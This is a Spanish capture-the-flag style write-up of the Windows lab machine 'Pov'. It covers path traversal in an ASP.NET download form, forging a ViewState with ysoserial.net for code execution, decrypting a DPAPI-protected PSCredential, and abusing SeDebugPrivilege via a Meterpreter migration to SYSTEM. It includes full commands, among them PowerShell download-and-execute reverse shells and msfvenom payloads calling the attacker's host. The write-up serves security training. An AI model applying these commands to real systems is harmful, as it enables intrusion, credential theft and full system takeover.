---
title: "Pov (Medium)"
date: 2026-11-07
author: "Isma"
slug: "pov"
tags: ["Windows", "IIS", "ASP.NET", "LFI", "Path Traversal", "Deserialization", "ViewState", "DPAPI", "SeDebugPrivilege"]
categories: ["Machine", "CPTS Preparation"]
draft: false
source: "obsidian"
---

## Resumen

Pov es una máquina Windows con un único puerto abierto (IIS) y una cadena muy limpia centrada en **ASP.NET WebForms**. Un **path traversal** en el botón *Download CV* de un subdominio de desarrollo me permite leer `web.config`, donde está en claro el `machineKey` que el servidor usa para firmar y cifrar el **ViewState**. Con esas claves fabrico con **ysoserial.net** un ViewState malicioso que, al deserializarse, ejecuta comandos: RCE como `sfitz`. En su perfil hay un `connection.xml` con una credencial **PSCredential protegida con DPAPI** que descifro para moverme a `alaading`. Este usuario tiene **SeDebugPrivilege**, que uso para migrar a un proceso de `SYSTEM`.

## Reconocimiento

Empiezo con un escaneo de todos los puertos:

```bash
nmap -p- -Pn --open -sS -sVC --min-rate 5000 10.129.230.183
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
```

Solo hay **HTTP en IIS**. Todo el ataque pasa por la web.

### Web y subdominio dev

La web principal es la página de un proyecto de ciberseguridad. En la sección de contacto aparece un subdominio: **`dev.pov.htb`**, que añado a `/etc/hosts`.

![pov](/images/obsidian/pov/pasted-image-20260816180041.png)

En `dev.pov.htb` hay un portfolio de un desarrollador, Stephen, con un botón para descargar su CV:

![pov](/images/obsidian/pov/pasted-image-20260816183235.png)

En la lista de tecnologías destaca **ASP.NET** en negrita, toda una pista de por dónde van los tiros:

![pov](/images/obsidian/pov/pasted-image-20260816183307.png)

## Acceso Inicial (Foothold)

### Path traversal en "Download CV"

Al pulsar *Download CV* e interceptar la petición con Burp veo que es un *postback* típico de WebForms (`__EVENTTARGET=download`, `__VIEWSTATE`, `__EVENTVALIDATION`…) con un parámetro **`file`** que indica qué fichero servir. Pruebo a pedir otros ficheros. El filtro elimina las secuencias `../`, pero no de forma recursiva, así que `....//` se queda en `../` después del filtrado:

```http
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
Content-Type: application/x-www-form-urlencoded

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=wMBIf6CO...&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=TCynJWN1...&file=....//web.config
```

Así consigo descargar el **`web.config`** de la aplicación:

![pov](/images/obsidian/pov/pasted-image-20260816185407.png)

Dentro está el `machineKey`:

```xml
<machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
```

### Por qué el machineKey es tan grave: ViewState

ASP.NET WebForms "recuerda" el estado de los controles de la página entre peticiones serializándolo en un blob que viaja al cliente en el campo oculto `__VIEWSTATE`. En el siguiente POST el servidor lo recibe y lo **deserializa** para reconstruir la página antes de procesar el evento.

Deserializar datos que vienen del cliente es peligroso, así que ASP.NET protege el ViewState con el `machineKey`:

- **`validationKey`**: calcula un MAC (aquí HMAC-SHA1) para comprobar que nadie ha modificado el blob.
- **`decryptionKey`**: cifra el blob con AES para que no se pueda ni leer.

Sin esas claves el servidor rechaza cualquier ViewState manipulado. **Con ellas**, puedo fabricar uno que el servidor considerará legítimo, y meter dentro lo que quiera.

### RCE con ysoserial.net

**ysoserial.net** genera un ViewState cuyo contenido no es un estado de página, sino una **cadena de gadgets .NET** que ejecuta un comando al deserializarse. Luego lo cifra y lo firma con las claves robadas. Uso el plugin `ViewState` con el gadget **`TextFormattingRunProperties`**, y le indico la ruta de la página y los algoritmos que vi en `web.config`.

Primero lo pruebo con un comando inocuo y después con una reverse shell de PowerShell (Nishang):

```powershell
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties `
  -c "powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.15.252/nishang.ps1')" `
  --path="/portfolio/default.aspx" --apppath="/" `
  --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" `
  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```

![pov](/images/obsidian/pov/pasted-image-20260816201853.png)

Sustituyo el `__VIEWSTATE` de la petición de *Download CV* por el generado. El código se ejecuta **en la fase de deserialización**, antes de que la página procese el evento, así que da igual que `__EVENTVALIDATION` o el resto de la petición no cuadren:

![pov](/images/obsidian/pov/pasted-image-20260816201845.png)

![pov](/images/obsidian/pov/pasted-image-20260816201933.png)

Recibo la shell como **`pov\sfitz`**.

- https://github.com/pwntester/ysoserial.net

## Movimiento Lateral

### Credencial DPAPI en connection.xml

En los documentos de `sfitz` hay un fichero `connection.xml`:

```powershell
type C:\Users\sfitz\Documents\connection.xml
```

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
    </TN>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb0100...</SS>
    </Props>
  </Obj>
</Objs>
```

Es un objeto **PSCredential** exportado con `Export-CliXml`. La contraseña (`SS` = *SecureString*) está cifrada con **DPAPI** usando la clave del usuario que la exportó. Como estoy ejecutando código como ese mismo usuario (`sfitz`), Windows me deja descifrarla sin más:

```powershell
$creds = Import-CliXml -Path C:\Users\sfitz\Documents\connection.xml
$creds.GetNetworkCredential() | fl *
```

```
UserName       : alaading
Password       : f8gQ8fynP44ek1m3
```

### Ejecución como alaading

WinRM no está expuesto hacia fuera, pero puedo abrir una sesión de PowerShell Remoting **local** con esas credenciales y lanzar otra reverse shell (la misma `nishang.ps1` con el puerto cambiado a 9444):

```powershell
$session = New-PSSession -ComputerName pov -Credential $creds
Invoke-Command -Session $session -ScriptBlock { whoami }
Invoke-Command -Session $session -ScriptBlock { iex(new-object net.webclient).downloadstring('http://10.10.15.252/nishang.ps1') }
```

```
pov\alaading
```

Ya como `alaading` leo la **User Flag** en su escritorio.

## Escalada de Privilegios

### SeDebugPrivilege

Reviso los privilegios del token:

![pov](/images/obsidian/pov/pasted-image-20260816232011.png)

```
SeChangeNotifyPrivilege        Enabled
SeIncreaseWorkingSetPrivilege  Enabled
SeDebugPrivilege               Disabled
```

**SeDebugPrivilege** permite abrir y manipular cualquier proceso del sistema, incluidos los de `SYSTEM`. Aparece como *Disabled*, pero eso solo significa que no está activo en el token: el usuario lo tiene asignado y cualquier proceso puede activarlo.

Mis primeros intentos no funcionan: volcar LSASS con `procdump` no me da credenciales útiles, y crear un proceso hijo de `winlogon.exe` con `psgetsys.ps1` tampoco me devuelve shell desde esta sesión.

- https://github.com/decoder-it/psgetsystem
- https://github.com/bruno-1337/SeDebugPrivilege-Exploit

### Migración a winlogon con Meterpreter

Opto por la vía más directa: una sesión de **Meterpreter**, que puede inyectarse en otro proceso con `migrate`. Genero el payload y levanto el handler:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.15.252 LPORT=9445 -f exe > revshell.exe
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_tcp;set LHOST tun0;set LPORT 9445;run;"
```

Lo descargo y lo ejecuto **desde PowerShell** como `alaading`:

```powershell
wget "http://10.10.15.252/revshell.exe" -outfile "revshell.exe"
.\revshell.exe
```

> **¿Por qué desde PowerShell?**
> Que el usuario tenga `SeDebugPrivilege` asignado no significa que el proceso lo tenga activo. `cmd.exe` no activa los privilegios sensibles por su cuenta, mientras que PowerShell (.NET) sí los habilita al arrancar. El proceso hijo `revshell.exe` hereda ese token con el privilegio **Enabled**, que es justo lo que Meterpreter necesita para abrir procesos de `SYSTEM`.

Con la sesión abierta busco el PID de `winlogon.exe` (552), que corre como `SYSTEM`, y migro a él:

```
meterpreter > migrate 552
[*] Migrating from 4504 to 552...
[*] Migration completed successfully.
```

![pov](/images/obsidian/pov/pasted-image-20260817001635.png)

Ya soy **`NT AUTHORITY\SYSTEM`** y leo la **Root Flag**:

![pov](/images/obsidian/pov/pasted-image-20260817001957.png)

## Conclusiones

- Un path traversal que parece "solo lectura" se convierte en RCE cuando el fichero leído es `web.config`: el `machineKey` es la llave de la deserialización de ViewState. Hay que tratarlo como un secreto y rotarlo si se filtra.
- Los filtros de `../` deben ser recursivos o, mejor, trabajar con una lista blanca de ficheros permitidos.
- `Export-CliXml` con DPAPI solo protege frente a *otros* usuarios: cualquiera que ejecute código como el propietario la descifra al instante.
- **SeDebugPrivilege** en una cuenta no administrativa equivale a `SYSTEM`, esté *Enabled* o *Disabled*.
